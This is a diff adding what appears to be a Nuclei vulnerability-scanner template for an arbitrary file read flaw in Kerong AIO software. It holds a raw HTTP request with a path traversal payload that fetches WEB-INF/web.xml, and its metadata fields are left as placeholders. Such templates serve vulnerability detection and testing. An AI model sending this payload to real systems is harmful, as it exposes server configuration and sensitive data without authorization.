@@ -1,0 +1,23 @@
+id: kerongAIO-ReadFile
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 科荣 AIO ReadFile 任意文件读取，攻击者可通过此漏洞获取敏感信息。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
